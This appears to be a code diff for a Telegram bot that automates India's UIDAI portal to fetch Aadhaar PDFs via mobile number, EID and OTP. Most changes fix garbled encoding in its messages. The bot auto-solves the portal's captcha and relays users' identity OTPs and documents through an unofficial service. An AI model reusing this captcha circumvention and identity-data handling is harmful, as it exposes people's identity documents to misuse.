+            msg = f"<b>{emo('🛠️')} ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ is now {status_str}</b>"
         await update.message.reply_text(msg, parse_mode='HTML')
 
     async def handle_broadcast_confirm(self, update, ctx):
@@ -2623,7 +2585,7 @@ class AadhaarBot:
                 await query.message.delete()
             except Exception:
                 pass
-            await query.message.reply_text("Ã¢ÂÂ Cancelled")
+            await query.message.reply_text("❌ Cancelled")
             return
 
         data = self.get_user_data(uid)
@@ -2634,13 +2596,13 @@ class AadhaarBot:
         users = get_all_users()
         total_users = len(users)
 
-        mode_prefix = f"{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂªÃÂ´ " if pin_mode else ""
+        mode_prefix = f"{emo('📌')} ᴘɪɴ " if pin_mode else ""
         prog = await query.message.reply_text(
-            f"<b>{emo('Ã¢ÂÂ¡')} ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...</b>\n\n"
+            f"<b>{emo('⚡')} ʙʀᴏᴀᴅᴄᴀsᴛ sᴛᴀʀᴛᴇᴅ...</b>\n\n"
             f"<blockquote>"
-            f"<b>{emo('Ã°ÂÂÂ')} Progress:</b> [Ã¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂ] 0.0%\n"
-            f"<b>{emo('Ã°ÂÂÂ¥')} Processed:</b> 0/{total_users} (Ã¢ÂÂ 0 | Ã¢ÂÂ 0)\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Status:</b> <i>Dispatching messages...</i>"
+            f"<b>{emo('📊')} Progress:</b> [░░░░░░░░░░] 0.0%\n"
+            f"<b>{emo('👥')} Processed:</b> 0/{total_users} (✅ 0 | ❌ 0)\n"
+            f"<b>{emo('🔄')} Status:</b> <i>Dispatching messages...</i>"
             f"</blockquote>",
             parse_mode='HTML')
 
@@ -2654,10 +2616,10 @@ class AadhaarBot:
 
             def render_bar(current, total, length=10):
                 if total <= 0:
-                    return "Ã¢ÂÂ" * length, 0.0
+                    return "░" * length, 0.0
                 pct = min(1.0, current / total)
                 filled = int(round(length * pct))
-                bar = "Ã¢ÂÂ" * filled + "Ã¢ÂÂ" * (length - filled)
+                bar = "█" * filled + "░" * (length - filled)
                 return bar, pct * 100.0
 
             async def send_to_user(target_uid):
@@ -2684,7 +2646,7 @@ class AadhaarBot:
                         elif text:
                             sent_item = await ctx.bot.send_message(
                                 chat_id=target_uid,
-                                text=f"<b>{emo('Ã°ÂÂÂ¢')} ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â ÃªÂÂ°ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´</b>\n\n{text}",
+                                text=f"<b>{emo('📢')} ʙʀᴏᴀᴅᴄᴀsᴛ ꜰʀᴏᴍ ᴀᴅᴍɪɴ</b>\n\n{text}",
                                 parse_mode='HTML'
                             )
 
@@ -2733,11 +2695,11 @@ class AadhaarBot:
 
                     bar, pct = render_bar(cur, total_users)
                     status_text = (
-                        f"<b>{emo('Ã¢ÂÂ¡')} ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â ÃÂªÃÂ´ Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ¢ÃÂÃ¡Â´Âss...</b>\n\n"
+                        f"<b>{emo('⚡')} ʙʀᴏᴀᴅᴄᴀsᴛ ɪɴ ᴘʀᴏɢʀᴇss...</b>\n\n"
                         f"<blockquote>"
-                        f"<b>{emo('Ã°ÂÂÂ')} Progress:</b> [{bar}] {pct:.1f}%\n"
-                        f"<b>{emo('Ã°ÂÂÂ¥')} Processed:</b> {cur}/{total_users} (Ã¢ÂÂ {ok} | Ã¢ÂÂ {fail})\n"
-                        f"<b>{emo('Ã¢ÂÂ³')} Status:</b> <i>Sending at high speed...</i>"
+                        f"<b>{emo('📊')} Progress:</b> [{bar}] {pct:.1f}%\n"
+                        f"<b>{emo('👥')} Processed:</b> {cur}/{total_users} (✅ {ok} | ❌ {fail})\n"
+                        f"<b>{emo('⏳')} Status:</b> <i>Sending at high speed...</i>"
                         f"</blockquote>"
                     )
                     now = time.time()
@@ -2774,12 +2736,12 @@ class AadhaarBot:
             bar, _ = render_bar(total_users, total_users)
             try:
                 await prog.edit_text(
-                    f"<b>{emo('Ã°ÂÂÂ')} {mode_prefix}ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â!</b>\n\n"
+                    f"<b>{emo('🎉')} {mode_prefix}ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!</b>\n\n"
                     f"<blockquote>"
-                    f"<b>{emo('Ã°ÂÂÂ')} Progress:</b> [{bar}] 100.0%\n"
-                    f"<b>{emo('Ã°ÂÂÂ¥')} Total Users:</b> <code>{total_users}</code>\n"
-                    f"<b>{emo('Ã¢ÂÂ')} Successfully Sent:</b> <code>{ok_count}</code>\n"
-                    f"<b>{emo('Ã¢ÂÂ')} Failed (Blocked/Deleted):</b> <code>{fail_count}</code>"
+                    f"<b>{emo('📊')} Progress:</b> [{bar}] 100.0%\n"
+                    f"<b>{emo('👥')} Total Users:</b> <code>{total_users}</code>\n"
+                    f"<b>{emo('✅')} Successfully Sent:</b> <code>{ok_count}</code>\n"
+                    f"<b>{emo('❌')} Failed (Blocked/Deleted):</b> <code>{fail_count}</code>"
                     f"</blockquote>",
                     parse_mode='HTML')
             except Exception:
@@ -2829,12 +2791,12 @@ class AadhaarBot:
             await asyncio.sleep(0.2)
 
         await update.message.reply_text(
-            f"Ã¢ÂÂ Auto-captcha failed after {max_retries} tries.\n/start again."
+            f"❌ Auto-captcha failed after {max_retries} tries.\n/start again."
         )
         return None, None
 
     # ==========================================
-    # PHASE 1 Ã¢ÂÂ Mobile Ã¢ÂÂ EID
+    # PHASE 1 — Mobile → EID
     # ==========================================
     async def _uidai_start_flow(self, update, ctx, mobile, name="Mr", dob=None, max_retries=10):
         user_id = update.effective_user.id
@@ -2847,7 +2809,7 @@ class AadhaarBot:
 
         eff_msg = update.effective_message or (update.callback_query.message if update.callback_query else None)
         prog = await eff_msg.reply_text(
-            f"<b>{emo('Ã¢ÂÂ³')} ÃÂªÃÂ´ÃÂªÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂÃÂªÃ¡Â´Â¢ÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â 1...</b>",
+            f"<b>{emo('⏳')} ɪɴɪᴛɪᴀʟɪᴢɪɴɢ ᴘʜᴀsᴇ 1...</b>",
             parse_mode='HTML')
         timeout = aiohttp.ClientTimeout(total=8, connect=3.5)
         last_err = "Unknown"
@@ -2860,7 +2822,7 @@ class AadhaarBot:
                     asyncio.create_task(
                         safe_edit_text(
                             prog,
-                            f"<b>{emo('Ã¢ÂÂ³')} ÃÂªÃÂ´ÃÂªÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂÃÂªÃ¡Â´Â¢ÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â 1... ({attempt}/{max_retries})</b>",
+                            f"<b>{emo('⏳')} ɪɴɪᴛɪᴀʟɪᴢɪɴɢ ᴘʜᴀsᴇ 1... ({attempt}/{max_retries})</b>",
                             parse_mode='HTML'
                         )
                     )
@@ -2931,7 +2893,7 @@ class AadhaarBot:
                 last_err = rd.get("message") or (resp.get("errorDetails") or {}).get("messageEnglish") or resp.get("message") or "Unknown"
                 logger.warning(f"[EID OTP1] attempt {attempt} UIDAI response error: {last_err}")
 
-                # Definitive or soft not-found from UIDAI Ã¢ÂÂ bail immediately, no 10x retry
+                # Definitive or soft not-found from UIDAI → bail immediately, no 10x retry
                 if is_not_linked_error(last_err) or is_soft_not_found_error(last_err):
                     try:
                         await prog.delete()
@@ -2942,7 +2904,7 @@ class AadhaarBot:
                     return False
 
             except Exception as e:
-                # Network/proxy/timeout error Ã¢ÂÂ retry
+                # Network/proxy/timeout error → retry
                 last_err = str(e)
                 logger.warning(f"[EID OTP1] attempt {attempt} network error: {e}")
 
@@ -2962,19 +2924,19 @@ class AadhaarBot:
             await eff_msg.reply_text(get_not_linked_msg(), parse_mode='HTML')
         elif "technical difficulties" in str(last_err).lower():
             await eff_msg.reply_text(
-                f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂª sÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂ´ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂªssÃ¡Â´ÂÃ¡Â´Â</b>\n\n"
+                f"<b>{emo('⚠️')} ᴜɪᴅᴀɪ sᴇʀᴠᴇʀ ᴛᴇᴄʜɴɪᴄᴀʟ ɪssᴜᴇ</b>\n\n"
                 "<blockquote>"
                 "<b>UIDAI portal par abhi temporary technical difficulty chal rahi hai.</b>\n\n"
-                "<b>Ã°ÂÂÂ¡ Solution:</b>\n"
-                "Ã¢ÂÂ¢ Agar is number par multiple Aadhaar link hain, to is format me bhejein:\n"
+                "<b>💡 Solution:</b>\n"
+                "• Agar is number par multiple Aadhaar link hain, to is format me bhejein:\n"
                 "  <code>Mobile|Name</code> (jaise: <code>9876543210|Rahul</code>)\n"
-                "Ã¢ÂÂ¢ Ya 1-2 minute baad dobara <b>/start</b> karke try karein."
+                "• Ya 1-2 minute baad dobara <b>/start</b> karke try karein."
                 "</blockquote>",
                 parse_mode='HTML'
             )
         elif "captcha" in str(last_err).lower():
             await eff_msg.reply_text(
-                f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´ Ã¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â</b>\n\n"
+                f"<b>{emo('⚠️')} ᴄᴀᴘᴛᴄʜᴀ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ᴛɪᴍᴇᴏᴜᴛ</b>\n\n"
                 "<blockquote>"
                 "<b>Captcha verification me issue aaya. Kripya /start se dobara number bhejein.</b>"
                 "</blockquote>",
@@ -2983,7 +2945,7 @@ class AadhaarBot:
         else:
             err_clean = html.escape(str(last_err))
             await eff_msg.reply_text(
-                f"<b>Ã¢ÂÂ Server error after {max_retries} tries:</b> <code>{html.escape(str(err_clean))}</code>\n/start se dobara.",
+                f"<b>❌ Server error after {max_retries} tries:</b> <code>{html.escape(str(err_clean))}</code>\n/start se dobara.",
                 parse_mode='HTML'
             )
         self.clear_user_data(user_id)
@@ -2995,7 +2957,7 @@ class AadhaarBot:
         data = self.get_user_data(user_id)
 
         msg = await update.message.reply_text(
-            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´ ÃÂªÃÂ´ Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ¢ÃÂÃ¡Â´Âss...</b>",
+            f"<b>{emo('⏳')} ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ɪɴ ᴘʀᴏɢʀᴇss...</b>",
             parse_mode='HTML')
 
         payload = {
@@ -3031,7 +2993,7 @@ class AadhaarBot:
 
         if not resp:
             err_clean = html.escape(str(last_req_err or "Server Timeout"))
-            await msg.edit_text(f"<b>Ã¢ÂÂ Error:</b> <code>{html.escape(str(err_clean))}</code>\nDubara OTP ya /cancel.", parse_mode='HTML')
+            await msg.edit_text(f"<b>❌ Error:</b> <code>{html.escape(str(err_clean))}</code>\nDubara OTP ya /cancel.", parse_mode='HTML')
             return
 
         rd = resp.get("responseData", {}) if isinstance(resp, dict) else {}
@@ -3050,7 +3012,7 @@ class AadhaarBot:
             err_lower = str(err).lower()
             if err_code in ("REU_NET_OTP_ERR_001", "REU_NET_RED_ERR_001") or "technical difficulties" in err_lower or resp.get("status_code") in (500, 502, 503, 504):
                 await msg.edit_text(
-                    f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂª ÃªÂÂ±Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂ´ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂªÃªÂÂ±ÃªÂÂ±Ã¡Â´ÂÃ¡Â´Â</b>\n\n"
+                    f"<b>{emo('⚠️')} ᴜɪᴅᴀɪ ꜱᴇʀᴠᴇʀ ᴛᴇᴄʜɴɪᴄᴀʟ ɪꜱꜱᴜᴇ</b>\n\n"
                     f"<blockquote>UIDAI server par temporary glitch hai (yeh galat OTP nahi hai).\n"
                     f"Kripya 5 second ruk kar yahi OTP dubara enter karein ya /cancel karein.</blockquote>",
                     parse_mode='HTML'
@@ -3062,14 +3024,14 @@ class AadhaarBot:
 
             if retries >= 3:
                 await msg.edit_text(
-                f"<b>Ã¢ÂÂ Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´ ÃªÂÂ°Ã¡Â´ÂÃÂªÃÂÃ¡Â´ÂÃ¡Â´Â</b>\n<b>{html.escape(str(err_clean))}</b>\n"
+                f"<b>❌ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ꜰᴀɪʟᴇᴅ</b>\n<b>{html.escape(str(err_clean))}</b>\n"
                 f"<b>3 attempts fail. /start</b>", parse_mode='HTML')
                 self.clear_user_data(user_id)
                 return
 
             await msg.edit_text(
-                f"<b>Ã¢ÂÂ OTP galat: {err_clean}</b>\n<b>Attempt {retries}/3</b>\n"
-                f"<b>{emo('Ã°ÂÂÂ¥')} Dubara OTP type karo:</b>", parse_mode='HTML')
+                f"<b>❌ OTP galat: {err_clean}</b>\n<b>Attempt {retries}/3</b>\n"
+                f"<b>{emo('🔥')} Dubara OTP type karo:</b>", parse_mode='HTML')
             return
 
         resp_name = rd.get("name") or data.get("uidai_name", "Mr")
@@ -3091,14 +3053,14 @@ class AadhaarBot:
             prog = status_msg
             try:
                 await prog.edit_text(
-                    f"<b>{emo('Ã¢ÂÂ³')} ÃÂ¢Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...</b>",
+                    f"<b>{emo('⏳')} ɢᴇɴᴇʀᴀᴛɪɴɢ ᴀᴀᴅʜᴀᴀʀ ᴏᴛᴘ...</b>",
                     parse_mode='HTML')
             except Exception:
                 pass
         else:
             eff_msg = update.effective_message or (update.callback_query.message if update.callback_query else None)
             prog = await eff_msg.reply_text(
-                f"<b>{emo('Ã¢ÂÂ³')} ÃÂ¢Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â...</b>",
+                f"<b>{emo('⏳')} ɢᴇɴᴇʀᴀᴛɪɴɢ ᴀᴀᴅʜᴀᴀʀ ᴏᴛᴘ...</b>",
                 parse_mode='HTML')
 
         last_err = "Unknown error"
@@ -3112,7 +3074,7 @@ class AadhaarBot:
                     asyncio.create_task(
                         safe_edit_text(
                             prog,
-                            f"<b>{emo('Ã¢ÂÂ³')} ÃÂ¢Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â... ({attempt}/{max_retries})</b>",
+                            f"<b>{emo('⏳')} ɢᴇɴᴇʀᴀᴛɪɴɢ ᴀᴀᴅʜᴀᴀʀ ᴏᴛᴘ... ({attempt}/{max_retries})</b>",
                             parse_mode='HTML'
                         )
                     )
@@ -3162,7 +3124,7 @@ class AadhaarBot:
                 )
 
                 if resp.get("status") == "Success":
-                    logger.info(f"Ã¢ÂÂ EID to Aadhaar OTP success on attempt {attempt}")
+                    logger.info(f"✅ EID to Aadhaar OTP success on attempt {attempt}")
                     safe_delete_bg(prog)
 
                     self.update_user_data(user_id, 'uidai_otp2_txn', resp.get("txnId"))
@@ -3194,12 +3156,12 @@ class AadhaarBot:
                     msg_target = update.effective_message or (update.callback_query.message if update.callback_query else None)
                     if msg_target:
                         await msg_target.reply_text(
-                            f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â</b>\n\n"
+                            f"<b>{emo('❌')} ᴀᴀᴅʜᴀᴀʀ ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇᴅ</b>\n\n"
                             "<blockquote>"
-                            f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: {html.escape(str(msg))}</b>\n"
+                            f"<b>{emo('⚠️')} sᴛᴀᴛᴜs: {html.escape(str(msg))}</b>\n"
                             "<b>UIDAI database me ye Aadhaar card officially deactivate ho chuka hai (Deceased). Iska download OTP UIDAI allow nahi karta.</b>"
                             "</blockquote>\n\n"
-                            "<b>/start sÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂÃ¡Â´Â.</b>",
+                            "<b>/start sᴇ ᴅᴏʙᴀʀᴀ.</b>",
                             parse_mode='HTML'
                         )
                     self.clear_user_data(user_id)
@@ -3232,13 +3194,13 @@ class AadhaarBot:
             self.update_user_data(user_id, 'created_at', time.time()) # refresh session
 
             retry_kb = InlineKeyboardMarkup([
-                [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â", callback_data='retry_otp2', style="primary")],
-                [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ", callback_data='cancel_flow', style="danger")]
+                [InlineKeyboardButton("ᴅᴏʙᴀʀᴀ ᴏᴛᴘ ʙʜᴇᴊᴏ", callback_data='retry_otp2', style="primary")],
+                [InlineKeyboardButton("ᴄᴀɴᴄᴇʟ", callback_data='cancel_flow', style="danger")]
             ])
 
             if msg_obj:
                 await msg_obj.reply_text(
-                    f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} UIDAI Server Busy / Technical Glitch</b>\n\n"
+                    f"<b>{emo('⚠️')} UIDAI Server Busy / Technical Glitch</b>\n\n"
                     "<blockquote>"
                     f"<b>Status:</b> <code>{html.escape(str(err_clean))}</code>\n"
                     "<b>Aapka EID save hai. /start karne ki zaroorat nahi hai.</b>\n"
@@ -3251,7 +3213,7 @@ class AadhaarBot:
 
         if msg_obj:
             await msg_obj.reply_text(
-                f"Ã¢ÂÂ <b>EID to Aadhaar OTP fail ho gaya:</b> <code>{html.escape(str(err_clean))}</code>\n/start se dobara.",
+                f"❌ <b>EID to Aadhaar OTP fail ho gaya:</b> <code>{html.escape(str(err_clean))}</code>\n/start se dobara.",
                 parse_mode='HTML'
             )
         self.clear_user_data(user_id)
@@ -3263,17 +3225,17 @@ class AadhaarBot:
 
         eff_msg = update.effective_message or (update.callback_query.message if update.callback_query else None)
         prog = await eff_msg.reply_text(
-            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°...</b>\n<b>Ã¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂ  10%</b>",
+            f"<b>{emo('⏳')} ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ᴘᴅꜰ...</b>\n<b>▓░░░░░░░░░  10%</b>",
             parse_mode='HTML'
         )
 
         _progress_frames = [
-            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°...</b>\n<b>Ã¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂ  20%</b>",
-            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°...</b>\n<b>Ã¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂ  40%</b>",
-            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°...</b>\n<b>Ã¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂ  60%</b>",
-            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°...</b>\n<b>Ã¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂ  80%</b>",
-            f"<b>{emo('Ã¢ÂÂ³')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°...</b>\n<b>Ã¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂ  95%</b>",
-            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°...</b>\n<b>Ã¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂÃ¢ÂÂ  99%</b>",
+            f"<b>{emo('⏳')} ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ᴘᴅꜰ...</b>\n<b>▓▓░░░░░░░░  20%</b>",
+            f"<b>{emo('⏳')} ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ᴘᴅꜰ...</b>\n<b>▓▓▓▓░░░░░░  40%</b>",
+            f"<b>{emo('⏳')} ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ᴘᴅꜰ...</b>\n<b>▓▓▓▓▓▓░░░░  60%</b>",
+            f"<b>{emo('⏳')} ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ᴘᴅꜰ...</b>\n<b>▓▓▓▓▓▓▓▓░░  80%</b>",
+            f"<b>{emo('⏳')} ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ᴘᴅꜰ...</b>\n<b>▓▓▓▓▓▓▓▓▓░  95%</b>",
+            f"<b>{emo('🔓')} ᴜɴʟᴏᴄᴋɪɴɢ ᴘᴅꜰ...</b>\n<b>▓▓▓▓▓▓▓▓▓▓  99%</b>",
         ]
         _stop_anim = asyncio.Event()
 
@@ -3345,14 +3307,14 @@ class AadhaarBot:
             err_clean = html.escape(str(req_err))
             if "technical difficulties" in str(req_err).lower():
                 await prog.edit_text(
-                    f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂª ÃªÂÂ±Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃÂ´ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂªÃªÂÂ±ÃªÂÂ±Ã¡Â´ÂÃ¡Â´Â</b>\n\n"
+                    f"<b>{emo('⚠️')} ᴜɪᴅᴀɪ ꜱᴇʀᴠᴇʀ ᴛᴇᴄʜɴɪᴄᴀʟ ɪꜱꜱᴜᴇ</b>\n\n"
                     f"<blockquote>UIDAI download server par temporary technical glitch chal raha hai (yeh galat OTP nahi hai).\n"
                     f"Kripya 5 second ruk kar yahi OTP dubara enter karein ya /cancel karein.</blockquote>",
                     parse_mode='HTML'
                 )
                 return
             await prog.edit_text(
-                f"<b>Ã¢ÂÂ Download error: {err_clean}</b>\nDubara OTP ya /cancel.",
+                f"<b>❌ Download error: {err_clean}</b>\nDubara OTP ya /cancel.",
                 parse_mode='HTML')
             return
         finally:
@@ -3360,7 +3322,7 @@ class AadhaarBot:
             _anim_task.cancel()
 
         if not raw:
-            await prog.edit_text("<b>Ã¢ÂÂ Empty response from UIDAI. Dubara OTP ya /cancel.</b>", parse_mode='HTML')
+            await prog.edit_text("<b>❌ Empty response from UIDAI. Dubara OTP ya /cancel.</b>", parse_mode='HTML')
             return
 
         result = extract_pdf(raw)
@@ -3373,7 +3335,7 @@ class AadhaarBot:
             logger.warning(f"Download returned dict instead of PDF: {result}")
             if ("exceeded" in str(err).lower() or "regenerate" in str(err).lower()) and "please enter the correct" not in str(err).lower():
                 await prog.edit_text(
-                    f"<b>Ã¢ÂÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂxÃ¡Â´ÂÃÂªÃÂÃ¡Â´ÂÃ¡Â´Â / ÃÂªÃÂ´Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃ¡Â´Â</b>\n<b>{html.escape(str(err_clean))}</b>\n\n<b>/start se dobara process shuru karein.</b>",
+                    f"<b>❌ ᴏᴛᴘ ᴇxᴘɪʀᴇᴅ / ɪɴᴠᴀʟɪᴅ</b>\n<b>{html.escape(str(err_clean))}</b>\n\n<b>/start se dobara process shuru karein.</b>",
                     parse_mode='HTML')
                 self.clear_user_data(user_id)
                 return
@@ -3383,7 +3345,7 @@ class AadhaarBot:
                 pass  # Real wrong OTP, do not treat as technical difficulties
             elif err_code == "DEA_NET_SSA_ERR_101" or "technical difficulties" in str(err).lower():
                 await prog.edit_text(
